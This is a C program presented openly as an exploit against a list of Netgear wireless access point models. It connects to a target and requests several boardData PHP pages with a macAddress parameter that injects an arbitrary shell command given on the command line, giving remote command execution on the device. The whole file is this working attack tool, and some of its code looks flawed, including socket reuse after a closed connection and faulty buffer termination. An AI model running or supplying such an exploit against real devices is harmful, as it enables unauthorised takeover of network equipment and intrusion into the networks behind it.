// "Netgear WG102, Netgear WG103, Netgear WN604, Netgear WNDAP350, Netgear WNDAP360, Netgear WNAP320, Netgear WNAP210, Netgear WNDAP660",
// "Netgear WNDAP620, Netgear WNDAP380R, Netgear WNDAP380R(v2), Netgear WN370 Netgear WND930"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096
#define RESOURCE_COUNT 5

const char *resources[RESOURCE_COUNT] = {
    "boardData102.php",
    "boardData103.php",
    "boardDataNA.php",
    "boardDataWW.php",
    "boardDataJP.php"
};


void exploit(const char *target_ip, int port, const char *command) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char request[BUFFER_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return;
    }

    for (int i = 0; i < RESOURCE_COUNT; i++) {
        snprintf(request, sizeof(request),
                 "GET /%s?writeData=true&reginfo=0&macAddress=001122334455 -c 0 ;%s; echo # HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "Connection: close\r\n\r\n",
                 resources[i], command, target_ip);

        send(sock, request, strlen(request), 0);

        while (recv(sock, buffer, sizeof(buffer) - 1, 0) > 0) {
            buffer[BUFFER_SIZE - 1] = '\0';
            printf("%s", buffer);
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <port> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);
    const char *command = argv[3];

    exploit(target_ip, port, command);

    return EXIT_SUCCESS;
}